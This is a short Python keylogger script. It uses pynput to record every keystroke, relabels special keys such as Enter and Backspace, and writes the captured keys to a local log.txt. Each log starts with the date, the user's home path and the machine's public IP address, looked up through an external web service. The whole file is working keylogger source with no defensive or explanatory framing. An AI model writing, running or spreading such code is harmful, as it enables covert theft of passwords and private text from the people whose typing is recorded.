import pynput, time, os, random, requests, socket, pyxhook
from pynput.keyboard import Key, Listener

count = 0
keys = []

date_time = time.ctime(time.time())
user = os.path.expanduser('~').split(socket.gethostname())
pubIP = requests.get('https://api.ipify.org').text

Log_Title = f'Date/Time: {date_time} User: {user} PublicIP#: {pubIP} \n'
key_logs = []
key_logs.append(Log_Title)

def key_input(key):
    global keys, count
    key_substitution = ['Key.enter', '[ENTER]', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                        'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                        'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]']
    key = str(key).replace("'", "")
    if key in key_substitution:
        keys.append(key_substitution[key_substitution.index(key)+1])
        print("Passed1")
        count += 1
    else:
        keys.append(key)
        print("Passed2")
        count += 1
        #  print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        file_wr(keys)
        keys = []


def file_wr(keys):
    with open("log.txt", "a") as f:
        k = str(keys)
        f.write(k)

def key_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=key_input, on_release=key_release) as listener:
    listener.join()
